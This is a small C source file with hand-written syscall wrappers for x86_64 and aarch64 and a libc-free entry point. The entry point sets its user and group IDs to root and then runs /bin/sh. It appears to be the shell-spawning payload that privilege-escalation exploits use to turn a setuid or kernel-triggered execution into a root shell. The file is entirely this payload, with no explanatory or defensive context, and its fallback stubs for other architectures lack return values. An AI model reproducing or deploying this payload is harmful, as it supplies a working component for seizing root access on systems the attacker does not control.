#include <sys/syscall.h>

#if defined(__x86_64__)
static inline long syscall1(long n, long a1)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long syscall3(long n, long a1, long a2, long a3)
{
    long ret;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n), "D"(a1), "S"(a2), "d"(a3)
        : "rcx", "r11", "memory"
    );
    return ret;
}

#elif defined(__aarch64__)

static inline long syscall1(long n, long a1)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a1;

    __asm__ volatile (
        "svc #0"
        : "+r"(x0)
        : "r"(x8)
        : "memory"
    );

    return x0;
}

static inline long syscall3(long n, long a1, long a2, long a3)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a1;
    register long x1 __asm__("x1") = a2;
    register long x2 __asm__("x2") = a3;

    __asm__ volatile (
        "svc #0"
        : "+r"(x0)
        : "r"(x8), "r"(x1), "r"(x2)
        : "memory"
    );

    return x0;
}

#else
#warning "Unsupported architecture"
static inline long syscall1(long n, long a1) {}
static inline long syscall3(long n, long a1, long a2, long a3) {}
#endif

const char *const argv[] = {"/bin/sh", 0};
void _start () {
    syscall1(SYS_setuid, 0);
    syscall1(SYS_setgid, 0);
    syscall3(SYS_execve, (long)argv[0], (long)argv, 0);
}
